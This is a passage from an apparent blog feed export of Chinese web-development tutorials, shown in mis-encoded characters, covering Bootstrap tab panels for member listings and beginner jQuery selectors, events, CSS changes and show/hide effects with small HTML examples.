<p>ç”¨æˆ·æ¿å—ä¸»è¦ä½¿ç”¨äº†BootStrap tab,å‰é¢çš„ç« èŠ‚å·²ç»ä»‹ç»è¿‡å…¶ä½¿ç”¨æ–¹æ³•ã€‚ä¸»è¦åŒ…æ‹¬ï¼š</p>
<p><strong>1.åœ¨DIVä¸­åŠ å…¥role=â€tabpanelâ€ï¼Œè¯¥DIVåˆ™ä¼šæˆä¸ºtab</strong></p>
<pre><code>&lt;div role=&quot;tabpanel&quot;&gt;
&lt;/div&gt;
</code></pre><p><strong>2.ä½¿ç”¨åˆ—è¡¨æ¥åˆ¶ä½œæ ‡ç­¾é¡µ</strong></p>
<pre><code>&lt;ul id=&quot;myTabregister&quot; class=&quot;nav nav-tabs&quot; role=&quot;tablist&quot;&gt;
      &lt;li role=&quot;presentation&quot; class=&quot;active&quot;&gt;
         &lt;a href=&quot;#newRegister&quot; id=&quot;home-tab&quot; role=&quot;tab&quot; data-toggle=&quot;tab&quot; aria-controls=&quot;home&quot; aria-expanded=&quot;true&quot;&gt;æ–°ä¼šå‘˜&lt;/a&gt;         
     &lt;/li&gt;
      &lt;li role=&quot;presentation&quot; class=&quot;&quot;&gt;
          &lt;a href=&quot;#highScoreRegister&quot; role=&quot;tab&quot; id=&quot;profile-tab&quot; data-toggle=&quot;tab&quot; aria-controls=&quot;profile&quot; aria-expanded=&quot;false&quot;&gt;é«˜åˆ†ä¼šå‘˜&lt;/a&gt;
     &lt;/li&gt;

&lt;/ul&gt;
</code></pre><p>åŒæ ·ï¼Œåˆ—è¡¨ä¸­ï¼Œè¶…çº§é“¾æ¥çš„åœ°å€hrefçš„å€¼å’Œå•ä¸ªæ ‡ç­¾å†…å®¹é¡µçš„idå€¼ä¸€ä¸€å¯¹åº”ï¼Œå¦‚æœ€æ–°ä¼šå‘˜æ ‡ç­¾é¡¹çš„<code>href=&quot;newRegister&quot;</code>ã€‚</p>
<p><strong>3.æ ‡ç­¾å†…å®¹åŒºåŸŸï¼ˆtab-contentï¼‰</strong></p>
<pre><code>&lt;div id=&quot;myTabContent&quot; class=&quot;tab-content&quot; style=&quot;text-align:center;&quot;&gt;
    &lt;!--æœ€æ–°ä¼šå‘˜å±•ç¤ºåŒº--&gt;
    &lt;!--é«˜åˆ†ä¼šå‘˜å±•ç¤ºåŒº--&gt;
&lt;/div&gt;
</code></pre><p><strong>4.å•ä¸ªæ ‡ç­¾é¡µ(tabpanel)</strong></p>
<pre><code>&lt;div role=&quot;tabpanel&quot; class=&quot;tab-pane fade active in&quot; id=&quot;newRegister&quot; aria-labelledby=&quot;home-tab&quot;&gt;
                    &lt;div class=&quot;row&quot; style=&quot;margin-top:10px;&quot;&gt;
                        &lt;div class=&quot;col-md-2&quot; style=&quot;height:200px;&quot;&gt;
                            &lt;a href=&quot;ä¼šå‘˜ä¸»é¡µ&quot;&gt;
                                &lt;img class=&quot;img-circle&quot; src=&quot;å›¾ç‰‡è·¯å¾„&quot;style=&quot;width:80px; height: 80px;&quot; &gt;
                            &lt;/a&gt;
                        &lt;/div&gt;
                        &lt;!--å…¶ä»–æœ€æ–°ä¼šå‘˜â€¦â€¦--&gt;
                  &lt;/div&gt;
                  &lt;!--é«˜åˆ†ä¼šå‘˜--&gt;
</code></pre><p>è¯¥ç¤ºä¾‹ä»£ç ä¸­ä¸»è¦åˆ—å‡ºäº†â€œæœ€æ–°ä¼šå‘˜â€çš„å±•ç¤ºä¿¡æ¯ï¼Œå…¶IDä¸ºnewRegister,ä¸å…¶æ ‡ç­¾é¡¹çš„é“¾æ¥åœ°å€ç›¸åŒã€‚å…¶ä¸­æ¯ä¸ªä¼šå‘˜ä¿¡æ¯å æœ‰çš„å±å¹•å®½åº¦ä¸ºcol-md-2(åœ¨å³ä¾§ä»£ç ä¸­ä¸ºäº†æ»¡è¶³å±å¹•å°ºå¯¸éœ€è¦æ”¹ä¸ºcol-xs-2),ä¹Ÿå°±æ˜¯æ¯6ä¸ªç”¨æˆ·å æ®ä¸€è¡Œã€‚</p>
<p>æœ¬è¯¾ç¨‹å†…å®¹è½¬è‡ªï¼š<a href="http://hubwiz.com/" target="_blank" rel="external">æ±‡æ™ºç½‘</a></p>
]]></content>
      
        
        <tags>
            
            <tag> BootStrap </tag>
            
            <tag> å‰ç«¯ </tag>
            
            <tag> ç¼–ç¨‹ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JQueryå­¦ä¹ ç¬”è®°]]></title>
      <url>/2016/08/28/JQuery%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p><strong>JQueryæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p>Jqueryæ˜¯ä¸€ä¸ªåŸºäºjavascriptçš„æ¡†æ¶ï¼Œç­‰äºè¯´æŠŠjavascriptå°è£…äº†ä¸€ä¸‹ã€‚éœ€è¦åœ¨htmlä¸­é“¾æ¥äº†JQueryçš„æ–‡ä»¶æ‰èƒ½ç”¨ï¼Œä½ æŸ¥çœ‹æºä»£ç ï¼Œå°±èƒ½çœ‹åˆ°é“¾æ¥Jqueryçš„ä»£ç ï¼š</p>
<pre><code>&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot; src=&quot;https://www.xxx/js/jquery-1.8.3.min.js&quot;&gt;&lt;/script&gt;
</code></pre><a id="more"></a>
<p><strong>å­¦JQueryè·Ÿå­¦javascriptæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œæ˜¯ä¸æ˜¯è¦ç²¾é€šjavascriptæ‰èƒ½å­¦JQuery?</strong></p>
<p> jqueryæ˜¯åŸºäºjavascriptï¼Œæ‰€ä»¥å¯ä»¥è¯´å†™jqueryè„šæœ¬æœ‰ä¸€åŠæ˜¯åœ¨å†™javascriptï¼Œä½†jqueryåˆæœ‰å¾ˆå¤šç‰¹æ€§æ˜¯å®ƒç‹¬æœ‰çš„ã€‚jqueryæ˜¯å°è£…äº†javascriptï¼Œæ˜¯ä¸ºäº†ç®€åŒ–javascriptè„šæœ¬è€Œå­˜åœ¨ï¼Œæ‰€ä»¥æ²¡å¿…è¦ç²¾é€šjavascriptï¼Œjavascriptä¸­å¾ˆå¤šçš„å‡½æ•°åœ¨jqueryä¸­éƒ½æœ‰æ›´ç®€å•çš„æ›¿ä»£æ–¹å¼ã€‚</p>
<p><strong>å¼€å§‹å…¥é—¨å§</strong></p>
<p>å…¥é—¨ä¹‹å‰ï¼Œå…ˆç®€å•åœ°çœ‹ä¸€ä¸‹html+css+javascriptçš„è¯­æ³•ï¼Œå†æ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼Œè¿™ä¼šè®©ä½ æ›´å¥½åœ°ç†è§£ä»£ç ã€‚Jqueryæœ€å¤§çš„ç‰¹ç‚¹æ˜¯æ–¹ä¾¿å¯¹DOMçš„å°è£…ã€‚ä»€ä¹ˆæ˜¯DOMï¼ŸDOMå°±æ˜¯æ“ä½œhtmlæ–‡ä»¶çš„æ ‘ç»“æ„çš„æ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹å›¾ç‰‡ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/jquery1.gif" alt=""></p>
<p>ä»è¿™ä¸ªå›¾å¾ˆæ˜æ˜¾çš„å°±èƒ½çœ‹å‡ºï¼Œå®é™…ä¸Šhtmlæ–‡ä»¶ä¸­æ¯ä¸€ä¸ªæ ‡ç­¾éƒ½æ˜¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ•´ä¸ªhtmlæ–‡æ¡£ç»„æˆäº†ä¸€æ£µæ ‘ã€‚</p>
<p>åœ¨javascriptä¸­ï¼Œæˆ‘ä»¬æœ‰ä¸€äº›å‡½æ•°å¯ä»¥è®¿é—®è¿™äº›èŠ‚ç‚¹ï¼Œå¹¶å¯¹ä»–ä»¬è¿›è¡Œå¢åŠ ã€åˆ é™¤ã€ä¿®æ”¹ã€‚æ¯”å¦‚ï¼ŒgetElementById(xxx)å°±æ˜¯è·å¾—idä¸ºxxxçš„å¯¹è±¡ï¼Œå®ƒå¯èƒ½å°±æ˜¯ä¸€ä¸ªdivæ ‡ç­¾ã€‚æˆ‘ä»¬ç”¨é¢å‘å¯¹è±¡çš„æ€æƒ³æ¥çœ‹ï¼Œå®é™…ä¸Šè·å¾—çš„æ˜¯ä¸€ä¸ªidä¸ºxxxçš„divå¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡å®é™…ä¸Šå°±æ˜¯ä»<code>&lt;div id=xxx&gt;</code>åˆ°ç›¸åº”<code>&lt;/div&gt;</code>è¿™æ‰€æœ‰çš„å†…å®¹ã€‚</p>
<p>é€šè¿‡è¿™ä¸ªå¯¹è±¡çš„ç›¸å…³æ–¹æ³•å°±èƒ½å¾ˆæ–¹ä¾¿åœ°ç›´æ¥æ“ä½œhtmlæ–‡ä»¶ã€‚</p>
<p>åœ¨Jqueryä¸­ï¼ŒDOMå˜å¾—æ›´åŠ ç®€å•ã€‚</p>
<p><strong>é€‰æ‹©å™¨</strong></p>
<p>è¦æ“ä½œhtmlæ–‡æ¡£ï¼Œå°±ç”¨åˆ°é€‰æ‹©å™¨ã€‚</p>
<p>ä¸¾ä¸ªå¾ˆç®€å•çš„ä¾‹å­ï¼Œ$(â€œdiv#exmâ€) é€‰æ‹©äº†idä¸ºexmçš„divå…ƒç´ ã€‚å¦‚ä¸‹ä»£ç èƒ½è®©â€œæµ‹è¯•1â€è¿™ä¸‰ä¸ªå­—é€šè¿‡ç‚¹å‡»æŒ‰é’®æ˜¾ç¤ºåœ¨htmlä¸­ï¼š</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
$(document).ready(function(){
$(&quot;button&quot;).click(function(){
    $(&quot;div#test&quot;).html(&quot;æµ‹è¯•1&quot;);
});
});
&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;button type=&quot;button&quot;&gt;ç‚¹å‡»æˆ‘&lt;/button&gt;
&lt;div id=&quot;test&quot;&gt;&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>å¤§å®¶å¯ä»¥æŠŠä»£ç æ”¾è¿›<code>http://www.w3school.com.cn/tiy/t.asp?f=html_basic</code>è¿è¡Œï¼ŒæŸ¥çœ‹æ•ˆæœã€‚</p>
<p>æ¥åˆ†æä¸€ä¸‹è¿™ä¸€å°æ®µJqueryä»£ç ã€‚é¦–å…ˆï¼Œ$(document)ï¼Œè¿™ä¸ªé€‰æ‹©å™¨é€‰æ‹©çš„æ˜¯æ•´ä¸ªæ–‡æ¡£ã€‚readyæ˜¯ä¸€ä¸ªäº‹ä»¶ï¼Œè¡¨ç¤ºç­‰æ•´ä¸ªæ–‡æ¡£åŠ è½½å®Œæˆåå†è¿è¡Œè¿™æ®µjavascriptã€‚ä¸€èˆ¬Jqueryçš„ä»£ç éƒ½æ”¾åœ¨è¿™ä¸ªå—é‡Œé¢ã€‚$(â€œbottonâ€)é€‰æ‹©äº†æ–‡æ¡£ä¸­ç¬¬ä¸€ä¸ª<botton>ï¼Œä¹Ÿå°±æ˜¯æŒ‰é’®ã€‚clickä¹Ÿæ˜¯ä¸€ä¸ªäº‹ä»¶ï¼Œè¡¨ç¤ºå½“è¯¥æŒ‰é’®è¢«ç‚¹å‡»åæ‰§è¡Œè¿™é‡Œé¢çš„ä»£ç ã€‚$(â€œdiv#testâ€)å°±æ˜¯é€‰æ‹©çš„id=testçš„<div>å…ƒç´ ï¼Œå¯¹è¯¥å…ƒç´ æ‰§è¡Œæ–¹æ³•html()ï¼Œhtmlæ–¹æ³•å°±æ˜¯è¯»å–æˆ–ä¿®æ”¹<div></div>ä¸­çš„å†…å®¹ã€‚ï¼ˆå…·ä½“æ˜¯è¯»å–è¿˜æ˜¯ä¿®æ”¹è¦çœ‹å…·ä½“æƒ…å†µï¼Œåœ¨æˆ‘è¿™é‡Œå°±æ˜¯ä¿®æ”¹ï¼‰</div></botton></p>
<p>æ‰€ä»¥ï¼Œç‚¹å‡»äº†æŒ‰é’®åï¼Œ<code>&lt;div id=&quot;exm&quot;&gt;&lt;/div&gt;</code>ä¸­å°±è¢«åŠ å…¥äº†â€œæµ‹è¯•1â€ä¸‰ä¸ªå­—ã€‚</p>
<p>åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬ä¸€å…±æ¥è§¦åˆ°å¦‚ä¸‹å‡ ä¸ªæ¦‚å¿µï¼š</p>
<pre><code>é€‰æ‹©å™¨ï¼š$(xxx)

äº‹ä»¶ï¼šready()ã€click()

æ–‡æ¡£æ“ä½œæ–¹æ³•ï¼šhtml()
</code></pre><p>å¤§å®¶åº”è¯¥å°±äº†è§£ä¸ªå¤§æ¦‚äº†ã€‚é€šè¿‡Jqueryï¼Œæˆ‘ä»¬å°±å¯ä»¥æ“ä½œhtmlä¸­ä»»ä½•æ ‡ç­¾å†…çš„ä»»ä½•å†…å®¹ã€‚æˆ‘æ¥åˆ—ä¸¾å‡ ä¸ªã€‚</p>
<p><strong>ä¿®æ”¹css</strong></p>
<p>é€šè¿‡cssæ–¹æ³•å¯ä»¥æ“ä½œcssã€‚æ¯”å¦‚å¦‚ä¸‹ä»£ç ï¼š</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
$(document).ready(function(){
$(&quot;button&quot;).click(function(){
$(&quot;div#test&quot;).css(&quot;color&quot;, &quot;red&quot;);
});
});
&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;button type=&quot;button&quot;&gt;Click me&lt;/button&gt;
&lt;div id=&quot;test&quot;&gt;æµ‹è¯•2&lt;/div&gt;
&lt;/body&gt;

&lt;/html&gt;
</code></pre><p>å°†åˆšæ‰çš„ä»£ç æ”¹äº†ä¸€ç‚¹ï¼Œçœ‹è¿™å¥è¯ï¼š$(â€œdiv#exmâ€).css(â€œcolorâ€, â€œredâ€); å°†id=testçš„divå…ƒç´ çš„cssæ ·å¼colorå€¼æ”¹æˆredã€‚æˆ‘ä»¬ç‚¹å‡»äº†æŒ‰é’®åå°±èƒ½çœ‹åˆ°ï¼Œâ€œæµ‹è¯•2â€ä¸‰ä¸ªå­—å˜æˆäº†çº¢è‰²ã€‚</p>
<p><strong>éšè—å’Œæ˜¾ç¤ºå’ŒåŠ¨ç”»æ•ˆæœ</strong></p>
<p>Jqueryè‡ªå¸¦äº†ä¸€äº›åŠ¨ç”»æ•ˆæœï¼Œé€šè¿‡ä¸€äº›å‚æ•°å°±èƒ½æ˜¾ç¤ºå‡ºæ¥ã€‚çœ‹å¦‚ä¸‹ä»£ç </p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
$(document).ready(function(){
$(&quot;button&quot;).click(function(){
    $(&quot;div#test&quot;).hide(&apos;slow&apos;);
});
});
&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;button type=&quot;button&quot;&gt;Click me&lt;/button&gt;
&lt;div id=&quot;test&quot;&gt;æµ‹è¯•3&lt;/div&gt;
&lt;/body&gt;

&lt;/html&gt;
</code></pre><p>ç‚¹å‡»äº†æŒ‰é’®åï¼Œâ€œæµ‹è¯•3â€è¿™ä¸‰ä¸ªå­—æ…¢æ…¢æ»‘åŠ¨ç¦»å¼€äº†ï¼Œå¾ˆåƒå¹»ç¯ç‰‡æ˜¯å§ï¼Ÿæˆ‘ä¹Ÿåªæ˜¯æ”¹äº†ä¸€å¥è¯ï¼š$(â€œdiv#exmâ€).hide(â€˜slowâ€™); å°†id=testçš„divå…ƒç´ éšè—ï¼Œå¹¶ä¸”æ˜¯æ…¢æ…¢éšè—ï¼Œå› ä¸ºæœ‰â€™slowâ€™å‚æ•°ã€‚</p>
<p>hideæ–¹æ³•å°±æ˜¯éšè—ä¸€ä¸ªå…ƒç´ æ‰€æœ‰å†…å®¹çš„æ–¹æ³•ã€‚å®ƒæœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºéšè—çš„å¿«æ…¢ã€‚</p>
<p>å½“ç„¶æœ‰hideæ–¹æ³•å°±æœ‰showæ–¹æ³•ï¼Œç”¨æ³•ä¸€æ ·ã€‚è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•toggleï¼Œè¡¨ç¤ºåœ¨éšè—å’Œæ˜¾ç¤ºä¸­åˆ‡æ¢ã€‚æœ‰è¿™ä¸‰ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“å¼¹å‡ºä¸€ä¸ªèœå•æˆ–è®©ä¸€ä¸ªä¸è¦çš„å†…å®¹æ¶ˆå¤±ï¼Œè€Œä¸”æœ‰åŠ¨ç”»æ•ˆæœã€‚</p>
<p>å½“ç„¶ï¼ŒJqueryè¿˜æ”¯æŒæ›´å¤šåŠ¨ç”»æ•ˆæœï¼Œæœ‰å¾ˆå¤šæ–¹æ³•ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±å»æ¢ç´¢ã€‚</p>
<p><strong>æ”¹å˜å…ƒç´ å¤§å°</strong></p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨Jqueryçš„height()å’Œwidth()æ–¹æ³•æ”¹å˜ä¸€ä¸ªå…ƒç´ çš„å¤§å°ã€‚è¿™ä¸ªå·¥ä½œä¹Ÿå¯ä»¥ç”¨css()æ–¹æ³•å®Œæˆã€‚é€šè¿‡è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åŠ¨æ€æ”¹å˜æˆ‘ä»¬ç½‘ç«™çš„å…ƒç´ ï¼Œæ¥é€‚åº”ç”¨æˆ·æµè§ˆå™¨çš„åˆ†è¾¨ç‡ã€‚</p>
<p><strong>æ›´å¤šäº‹ä»¶ï¼šæ–‡æœ¬æ¡†è·å¾—ã€å¤±å»ç„¦ç‚¹</strong></p>
<p>åœ¨å¾ˆå¤šç½‘ç«™å¡«å†™è¡¨å•çš„åœ°æ–¹éƒ½ç”¨åˆ°äº†è¿™ä¸ªæ•ˆæœï¼š</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
$(document).ready(function(){
$(&quot;:text&quot;).focus(function(){
$(&quot;:text&quot;).val(&quot;&quot;);
});
});
&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;input type=&quot;text&quot; value=&quot;è¯·å¡«å†™ç”¨æˆ·å&quot; style=&quot;color: #999;&quot;/&gt;
&lt;/body&gt;

&lt;/html&gt;
</code></pre><p>å½“é¼ æ ‡ç‚¹å‡»è¾“å…¥æ¡†æ—¶â€œè¯·å¡«å†™ç”¨æˆ·åâ€è¿™å‡ ä¸ªå­—æ¶ˆå¤±æ‰ã€‚è¿™å°±æ˜¯focusäº‹ä»¶ï¼Œå®ƒè¡¨ç¤ºæŸä¸ªæ§ä»¶è·å¾—ç„¦ç‚¹ã€‚çœ‹çœ‹ä»£ç ï¼Œç”¨åˆ°äº†ä¸€ä¸ªé€‰æ‹©å™¨$(â€œ:textâ€)ï¼Œå®ƒè¡¨ç¤ºæ‰€æœ‰type=textçš„inputå…ƒç´ ã€‚å½“è¯¥å…ƒç´ è·å¾—ç„¦ç‚¹åï¼Œæ‰§è¡Œäº†valæ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•å°±æ˜¯æ”¹å˜inputæ ‡ç­¾çš„valueå±æ€§ï¼Œä¹Ÿå°±æ˜¯æ”¹å˜æ˜¾ç¤ºåœ¨æ–‡æœ¬æ¡†å†…çš„å†…å®¹ã€‚</p>
<p><strong>é€‰æ‹©å™¨è¯¦è§£å’Œcssè¯­æ³•</strong></p>
<p>ä¸Šé¢åªæåˆ°äº†ä¸€ä¸ªidé€‰æ‹©å™¨ï¼Œé€‰æ‹©id=xxxçš„æŸå…ƒç´ ã€‚å…¶å®Jqueryçš„é€‰æ‹©å™¨å¯è°“å¤šç§å¤šæ ·ï¼Œå¯¹cssæ¯”è¾ƒç†Ÿæ‚‰çš„åŒå­¦å°±å¾ˆå¥½å­¦äº†ï¼Œå› ä¸ºcssçš„è¯­æ³•Jqueryé€‰æ‹©å™¨åŸºæœ¬éƒ½èƒ½ç”¨ã€‚</p>
<p>æ¯”å¦‚ï¼Œcssé‡Œé¢ï¼Œå®šä¹‰ä¸€ä¸ªç±»çš„æ ·å¼çš„æ–¹æ³•ï¼š.XXX{}ï¼Œè€Œåœ¨Jqueryé‡Œé€‰æ‹©ä¸€ä¸ªclass=XXXçš„å…ƒç´ çš„æ–¹æ³•ï¼š$(â€œ.XXXâ€)ã€‚</p>
<p>ä¸¾ä¸€äº›å¸¸ç”¨çš„ä¾‹å­ï¼Œè¯¦ç»†çš„é€‰æ‹©å™¨è¯´æ˜åœ¨w3schoolé‡Œéƒ½æœ‰åˆ—å‡ºã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/jquery2.png" alt=""></p>
<p>è¿™åªæ˜¯æˆ‘ä¸¾çš„ä¸€äº›ä¾‹å­ï¼ŒåŸºæœ¬ä¸Šé€‰æ‹©å™¨Jqueryå’Œcssç±»ä¼¼ï¼Œæ‰€ä»¥å¯¹cssæ¯”è¾ƒç†Ÿæ‚‰çš„äººå¯ä»¥å¾ˆå¿«æŒæ¡Jqueryçš„é€‰æ‹©å™¨è¯­æ³•ï¼Œè¿™ä¹Ÿæ˜¯Jqueryæµè¡Œçš„åŸå› ä¹‹ä¸€ï¼Œå¾ˆå¥½å­¦ä¹ ï¼Œä¸€é€šç™¾é€šã€‚</p>
<p><strong>äº‹ä»¶è¯¦è§£</strong></p>
<p>åœ¨å¾ˆå¤šJqueryä»£ç ä¸­ï¼Œæˆ‘ä»¬æ€»æ˜¯èƒ½çœ‹åˆ°æ˜¯è¿™æ ·çš„å½¢å¼ï¼š</p>
<pre><code>$(document).ready(function(){
    //Jqueryä»£ç 
});
</code></pre><p>æ‰€æœ‰çš„ä»£ç è¢«å¥—åœ¨äº†æœ€å¤–å±‚çš„readyä¸­ã€‚æˆ‘ä¸Šæ¬¡ä¹Ÿæåˆ°äº†ï¼Œreadyæ˜¯ä¸€ä¸ªäº‹ä»¶ã€‚æˆ‘ä»¬ä¸Šé¢è¯´çš„é€‰æ‹©å™¨ï¼Œå®ƒé€‰æ‹©æŸå…ƒç´ çš„ä½œç”¨ï¼Œå…¶å®å°±æ˜¯ä¸ºäº†å®Œæˆåé¢çš„å·¥ä½œã€‚çœ‹æˆ‘ä»¬è¿™ä¸ªä»£ç ï¼Œ$(document)é€‰æ‹©çš„æ˜¯documentå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å­¦javascriptåº”è¯¥å¾ˆæ¸…æ¥šï¼ŒæŒ‡çš„å°±æ˜¯æ•´ä¸ªhtmlæ–‡æ¡£ã€‚é€‰åœ¨é€‰åœ¨åˆ°äº†å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æœ‰ä¸€ä¸ªæ–¹æ³•ready();</p>
<p>readyæ˜¯ä¸€ä¸ªäº‹ä»¶ã€‚äº‹ä»¶æ˜¯ä»€ä¹ˆæ¦‚å¿µï¼Œå’Œå¾ˆå¤šç¼–ç¨‹ä¸€æ ·ï¼Œäº‹ä»¶æ˜¯ç”±ç”¨æˆ·åœ¨æ‰§è¡Œç›¸åº”çš„æ“ä½œåè‡ªåŠ¨è§¦å‘çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥ç»™æŸäº‹ä»¶ç»‘å®šä¸€ä¸ªå¤„ç†å‡½æ•°ï¼Œå½“ç”¨æˆ·è§¦å‘äº†è¿™ä¸ªäº‹ä»¶åï¼Œå°±èƒ½æ‰§è¡Œæˆ‘ä»¬ç»‘å®šçš„å‡½æ•°ã€‚</p>
<p>ready()æ˜¯ä¸€ä¸ªäº‹ä»¶ç»‘å®šå‡½æ•°ï¼Œå®ƒä¸­é—´é‚£ä¸ªfunction(){}å°±æ˜¯æˆ‘ä»¬ä¸ºreadyäº‹ä»¶ç»‘å®šçš„å‡½æ•°ã€‚readyäº‹ä»¶åœ¨å¯¹è±¡åŠ è½½å®Œæˆåè§¦å‘ï¼Œæˆ‘ä»¬å‰é¢é€‰æ‹©çš„æ˜¯documentå¯¹è±¡ï¼Œæ‰€ä»¥è¿™ä¸ªreadyå°±æ˜¯æŒ‡æ•´ä¸ªæ–‡æ¡£åŠ è½½å®Œæˆåè§¦å‘çš„äº‹ä»¶ã€‚</p>
<p>æ‰€ä»¥æ•´æ®µä»£ç æ„æ€å°±æ˜¯ä¸ºdocumentå¯¹è±¡çš„readyäº‹ä»¶æ·»åŠ å“åº”å‡½æ•°function(){}ï¼Œè¿™ä¸ªå‡½æ•°é‡Œé¢æ·»åŠ æˆ‘ä»¬å¸Œæœ›Jqueryåšçš„äº‹æƒ…ã€‚å½“æ–‡æ¡£åŠ è½½å®Œæˆåï¼Œæ‰§è¡Œæ­¤å‡½æ•°ï¼Œç›¸å½“äºæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ã€‚</p>
<p>æˆ‘åˆ—ä¸¾ä¸€äº›Jqueryä¸­å¸¸ç”¨çš„äº‹ä»¶åŠå…¶ç»‘å®šå‡½æ•°ï¼š</p>
<pre><code>click é¼ æ ‡ç‚¹å‡»äº‹ä»¶ ï¼ˆæœ€å¸¸ç”¨ï¼Œå½“é¼ æ ‡ç‚¹å‡»æŸå¯¹è±¡æ—¶è§¦å‘æ­¤å‡½æ•°ï¼‰

change å¯¹è±¡è¢«æ”¹å˜ï¼ˆå¦‚inputæ¡†ä¸­å†™å…¥ã€ä¿®æ”¹ã€åˆ é™¤æ–‡å­—æ—¶è§¦å‘æ­¤äº‹ä»¶ï¼‰

focus å¯¹è±¡è·å¾—ç„¦ç‚¹ï¼ˆå¦‚å…‰æ ‡è¿›å…¥textareaæ¡†è§¦å‘æ­¤äº‹ä»¶ï¼‰

blur å¯¹è±¡å¤±å»ç„¦ç‚¹ï¼ˆä¸focusäº‹ä»¶ç›¸å¯¹ï¼‰

load å¯¹è±¡åŠ è½½å®Œæˆï¼ˆå¦‚å›¾åƒè¢«åŠ è½½å®Œæˆæ—¶è§¦å‘æ­¤äº‹ä»¶ï¼‰

error å¯¹è±¡é‡åˆ°é”™è¯¯ ï¼ˆå¦‚å›¾åƒè¾“å…¥äº†ä¸€ä¸ªé”™è¯¯çš„åœ°å€ï¼Œæ²¡æœ‰æˆåŠŸåŠ è½½ï¼‰

mousemove é¼ æ ‡ç§»åŠ¨ ï¼ˆå½“é¼ æ ‡ç§»åŠ¨æ—¶è§¦å‘æ­¤äº‹ä»¶ï¼‰
</code></pre><p>è¯•è¯•mousemoveäº‹ä»¶ï¼Œè¿è¡Œè¿™æ®µä»£ç ï¼š</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
$(document).ready(function(){
$(document).mousemove(function(e){
$(&quot;span&quot;).text(e.pageX + &quot;, &quot; + e.pageY);
});
});
&lt;/script&gt;
&lt;/head&gt;    
&lt;body&gt;
&lt;p&gt;é¼ æ ‡ä½äºåæ ‡ï¼š &lt;span&gt;&lt;/span&gt;.&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œé¼ æ ‡ç§»åŠ¨åå°±èƒ½è¾“å‡ºå½“å‰é¼ æ ‡æ‰€åœ¨çš„åæ ‡ã€‚å…¶ä¸­functionæœ‰ä¸€ä¸ªå‚æ•°eï¼Œæ¯ä¸ªäº‹ä»¶å‡½æ•°éƒ½æœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å°±æ˜¯æŒ‡è¯¥äº‹ä»¶æœ¬èº«ã€‚ï¼ˆå½“ç„¶è¿™ä¸ªå‚æ•°å¯ä»¥çœç•¥ï¼‰ï¼Œe.pageXå’Œe.pageYå°±æ˜¯æŒ‡é¼ æ ‡ä»¥ååé¼ æ ‡æ‰€åœ¨çš„ä½ç½®ã€‚</p>
<p><strong>htmlæ“ä½œè¯¦è§£</strong></p>
<p>é€‰æ‹©å™¨çš„ä½œç”¨æˆ‘è¯´äº†ï¼Œå°±æ˜¯å®Œæˆä¸ºäº†åé¢çš„æ“ä½œã€‚é™¤äº†ä¸ºé€‰æ‹©åˆ°çš„å¯¹è±¡æ·»åŠ ä¸€ä¸ªäº‹ä»¶å“åº”å‡½æ•°å¤–ï¼Œè¿˜èƒ½ç›´æ¥æ“ä½œæ­¤å¯¹è±¡ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„htmlæ“ä½œã€‚</p>
<p>æˆ‘ä¹Ÿåˆ—ä¸¾ä¸€äº›å¸¸ç”¨çš„htmlæ“ä½œæ–¹æ³•ï¼ˆæ›´è¯¦ç»†åœ°åœ¨w3schoolä¸­æŸ¥çœ‹ï¼‰</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/jquery3.png" alt=""></p>
